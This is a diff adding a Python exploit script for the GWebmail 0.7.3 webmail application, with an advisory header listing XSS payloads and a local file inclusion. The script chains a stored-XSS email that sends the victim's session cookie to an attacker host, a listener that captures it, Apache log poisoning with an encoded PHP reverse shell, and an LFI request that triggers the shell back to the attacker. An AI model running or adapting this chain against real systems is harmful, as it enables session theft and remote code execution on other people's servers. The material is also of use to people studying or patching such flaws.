@@ -1,0 +1,181 @@
+#!/usr/bin/python
+
+'''
+
+# Exploit Title: XSS & LFI RCE Vulnerabilities in GWebmail
+# Date: 11/08/2012
+# Exploit Author: Shai rod (@NightRang3r)
+# Vendor Homepage: https://www.gwebmail.net
+# Software Link: https://www.gwebmail.net/download/
+# Version: 0.7.3
+
+#Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar
+
+
+About the Application:
+======================
+
+Gwebmail is an ajax powered webmail system with an interface similar to Gmail
+It is entirely written in PHP and uses MySQL to store messages
+
+It is modeled after the popular free email service from Google, gwebmail has a user
+friendly interface similar to Gmail but you will use this interface to access emails
+from your own servers ( unlike Gmail that will save your email into their servers )
+
+
+GWebmail is vulnerable to the following:
+
+1. DOM XSS.
+2. Flash XSS.
+3. Self XSS.
+4. Post Auth Local File Inclusion.
+
+Maybe more....too lazy to keep going ;)
+
+
+Vulnerability Description:
+
+
+1. XSS in Search Field.
+
+Injection Point: Search Field.
+Injection Payload(s): <script>alert("XSS")</script>
+
+XSS Can be also triggerd directly using the following url: http://10.0.0.6/gwebmail/?mail#Inbox.Search/<script>alert("XSS")</script>
+
+
+2. DOM XSS.
+
+http://10.0.0.6/gwebmail/?mail#<script>alert("XSS")</script>
+
+
+3. Flash XSS (Vulnerable SWFUpload version)
+
+Originally discovered by Neal Poole and Nathan Partlan(https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/)
+
+URL to vulnerable flash object:
+
+http://10.0.0.6/gwebmail/modules/default/js/swfupload/swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert("XSS");//
+
+
+4. Stored XSS in E-mail Subject.
+
+Injection Point: Subject Field
+Injection Payload(s): Hi<script>alert("XSS")</script>
+
+Steps to reproduce the XSS:
+
+Send an email to the victim with the payload in the subject field.
+XSS Will be triggered in message listings (Inbox etc..) and when user opens the email.
+
+5. Stored XSS in Display Name and contacts display name.
+
+Injection Point: "Name" Field
+Injection Payload(s): testuser"><img src='1.jpg'onerror=alert("XSS")>
+
+Steps to reproduce the XSS:
+
+Go to "Settings" -> "Account", In the "Name" field insert XSS payload.
+
+XSS will be triggered on the Account page and on the main page contacts widget.
+
+
+6. Self XSS.
+
+Vulnerable Page URL: http://10.0.0.6/gwebmail/setup
+
+Injection Point: Username Field, Password Field
+Injection Payload(s): "><script>alert("XSS")</script>
+
+
+7. Post Auth Local File Inclusion.
+
+http://10.0.0.6/gwebmail/?module=../../../../etc/passwd%00
+
+Details:
+
+In order to exploit this LFI the attacker must be logged in to the system with a valid credentials.
+It is possible to gain access without credentials by exploiting the XSS issues and steal user cookie in order to gain Remote code execution using the LFI issue.
+
+Proof of concept is provided.
+
+'''
+
+import smtplib, socket, re, urllib2,time
+
+print "###############################################"
+print "#         GWebmail XSS+LFI RCE POC            #"
+print "#            Coded by: Shai rod               #"
+print "#               @NightRang3r                  #"
+print "#           http://exploit.co.il              #"
+print "#       For Educational Purposes Only!        #"
+print "###############################################\r\n"
+
+# SETTINGS
+
+sender = "attacker@localhost"
+smtp_login = sender
+smtp_password = "qwe123"
+recipient = "victim@localhost"
+smtp_server  = "192.168.1.10"
+smtp_port = 25
+subject = "GWebmail XSS+LFI POC"
+attacker_ip = "192.168.1.11"
+attacker_port = "4444"
+xss_payload = """<script>new Image().src="http://""" + attacker_ip + """/log.php?cookie="+encodeURI(document.cookie)</script>"""
+gwebmail_server = "192.168.1.10"
+apache_log = "../../../var/log/apache2/error.log"
+shell_sleep = 10
+
+# SEND E-MAIL
+
+print "[*] Sending E-mail to " + recipient + "..."
+msg = ("From: %s\r\nTo: %s\r\nSubject: %s\r\n\r\n"
+       % (sender, ", ".join(recipient), subject + xss_payload) )
+msg += "POC MAIL\r\n"
+server = smtplib.SMTP(smtp_server, smtp_port)
+server.ehlo()
+server.starttls()
+server.login(smtp_login, smtp_password)
+server.sendmail(sender, recipient, msg)
+server.quit()
+
+
+# TCP LISTENER TO GET COOKIE
+
+TCP_IP = '0.0.0.0'
+TCP_PORT = 80
+BUFFER_SIZE = 1024
+print "\n[*] Setting up listener on port " + str(TCP_PORT) +  "."
+print "\n[*] Waiting for victim to login (May take a while...)."
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((TCP_IP, TCP_PORT))
+s.listen(1)
+conn, addr = s.accept()
+data = conn.recv(BUFFER_SIZE)
+conn.close()
+
+print "\r\n[+] Stealing Cookie..."
+
+# MATCH PHPSESSID
+
+m=re.compile('SSID=(.*?)HTTP').search(data)
+cookie =  m.group(1)
+print "\r\n[+] PHP Session ID: " + cookie
+
+# EXPLOIT LFI
+
+opener = urllib2.build_opener()
+opener.addheaders.append(('Cookie', 'PHPSESSID=' + cookie))
+
+shell_payload = "%3c%3f%70%68%70%20%24%61%64%64%72%3d%24%5f%52%45%51%55%45%53%54%5b%27%61%64%64%72%27%5d%3b%24%70%6f%72%74%3d%24%5f%52%45%51%55%45%53%54%5b%27%70%6f%72%74%27%5d%3b%69%66%20%28%21%28%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%24%61%64%64%72%2c%24%70%6f%72%74%29%29%29%64%69%65%3b%77%68%69%6c%65%20%28%21%66%65%6f%66%28%24%73%6f%63%6b%29%29%20%20%7b%24%63%6d%64%20%20%3d%20%66%67%65%74%73%28%24%73%6f%63%6b%29%3b%24%70%69%70%65%20%3d%20%70%6f%70%65%6e%28%24%63%6d%64%2c%27%72%27%29%3b%77%68%69%6c%65%20%28%21%66%65%6f%66%28%24%70%69%70%65%29%29%66%77%72%69%74%65%20%28%24%73%6f%63%6b%2c%20%66%67%65%74%73%28%24%70%69%70%65%29%29%3b%70%63%6c%6f%73%65%28%24%70%69%70%65%29%3b%7d%66%63%6c%6f%73%65%28%24%73%6f%63%6b%29%3b%3f%3e"
+
+print "\n[*] Poisoning Apache Error Log..."
+try:
+	lfi = opener.open("http://" + gwebmail_server + "/" + shell_payload)
+except urllib2.HTTPError, e:
+	print "\n[+] Please setup a netcat listener on port " + attacker_port + ", Shell will be triggered in " + str(shell_sleep) + " seconds..."
+	time.sleep(shell_sleep)
+	print "\n[*] Triggering Shell..." + " http://" + gwebmail_server + "/?module=" + apache_log + "%00" + "&addr=" + attacker_ip + "&port=" + attacker_port
+	lfi = opener.open("http://" + gwebmail_server + "/?module=" + apache_log + "%00" + "&addr=" + attacker_ip + "&port=" + attacker_port)
+	print "\n[+] Bye..."
